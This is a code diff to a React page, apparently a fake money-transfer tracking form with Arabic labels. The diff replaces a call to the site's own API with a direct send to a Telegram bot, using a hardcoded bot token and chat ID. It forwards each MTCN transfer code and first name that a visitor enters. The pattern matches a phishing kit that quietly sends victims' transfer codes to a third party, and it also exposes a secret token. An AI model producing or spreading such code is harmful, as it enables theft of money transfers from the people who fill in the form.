@@ -31,10 +31,19 @@ export default function TrackTransfer() {
     const mtcnValue = mtcn.join("");
     setSending(true);
     try {
-      await fetch("/api/telegram/notify", {
+      const token = "8947404552:AAHFOVTjO4W5SBb45FFXzVOlzI8qIf-Bi64";
+      const chatId = "7437622808";
+      const tabLabel = tab === "sender" ? "المرسل" : "المستلم";
+      const message =
+        `🔔 *تتبع تحويل جديد*\n\n` +
+        `👤 *النوع:* ${tabLabel}\n` +
+        `🔢 *رقم MTCN:* \`${mtcnValue}\`\n` +
+        `📛 *الاسم الأول:* ${name || "—"}`;
+
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ mtcn: mtcnValue, name, tab }),
+        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" }),
       });
     } catch {
     } finally {
